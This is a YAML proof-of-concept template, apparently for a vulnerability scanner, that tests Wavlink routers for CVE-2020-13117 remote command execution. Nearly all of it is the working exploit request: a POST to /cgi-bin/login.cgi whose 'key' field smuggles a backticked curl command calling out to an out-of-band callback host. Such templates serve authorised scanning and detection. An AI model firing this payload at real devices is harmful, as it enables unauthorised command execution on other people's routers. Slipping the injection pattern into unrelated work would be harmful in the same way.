name: poc-yaml-wavlink-cve-2020-13117-rce
manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cgi-bin/login.cgi
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.1&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60curl+{{reverseURL}}%3B%60%3B%23&password=asd&lang_select=en
        expression: reverse.wait(5)
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.tenable.com/cve/CVE-2020-13117
    vulnerability:
        id: CT-149534
        level: critical
